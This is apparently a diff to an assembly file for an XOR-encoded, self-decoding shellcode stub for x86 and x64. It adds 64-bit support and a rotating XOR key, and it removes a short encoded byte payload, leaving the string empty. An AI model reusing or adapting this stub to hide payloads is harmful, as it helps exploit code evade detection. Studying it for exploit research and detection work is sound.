@@ -1,5 +1,11 @@
-.set RW, 0x194c3bfd
+# /* Assembly source for XOR, both x86 & x64 compatible - Length: 28 & 34 bytes respectively */ #
+
 .set LEN, 50
+.if ARCH == 64
+	.set RW, 0x7333ce667e9d73dc
+.else
+	.set RW, 0x194c3bfd
+.endif
 
 .if ARCH == 64
 	.set Ecx, %rcx
@@ -12,12 +18,11 @@
 .endif
 
 .macro set_Ecx
-.if LEN > 0x100				# LEN is 2 bytes long
 	xor Ecx, Ecx
+.if LEN > 0xff				# LEN is 2 bytes long
 	movw $LEN, %cx
 .else					# LEN is 1 byte long
-	push $LEN
-	pop Ecx
+	movb $LEN, %cl
 .endif					# We now have Ecx == $LEN
 .endm
 
@@ -25,10 +30,7 @@
 .globl _start
 _start:
 	set_Ecx
-.if ARCH == 64
-	xor %rax, %rax
-.endif
-	movl $RW, %eax
+	mov $RW, Eax
 
 	jmp put_addr
 in_stack:
@@ -36,7 +38,7 @@ in_stack:
 
 xorloop:
 	xorb %al, -0x1(Esi, Ecx)
-	ror %eax
+	ror Eax
 	loop xorloop			# dec Ecx; jnz xorloop
 
 	jmp xoredcode
@@ -45,4 +47,4 @@ put_addr:
 	call in_stack
 
 xoredcode:
-	.ascii "\x6a\x18\x59\xb8\x19\x4c\x3b\xfd\xeb\x0b\x5e\x30\x44\x0e\xff\xd1\xc8\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x15\xf9\xff\x7f\xbf\xf0\x8d\x1e\x55\x32\x7d\xef\xa9\x6a\x68\xc3\xd5\x2f\x82\xa1\xc7\xcd\xa8\xb2"
+	.ascii ""
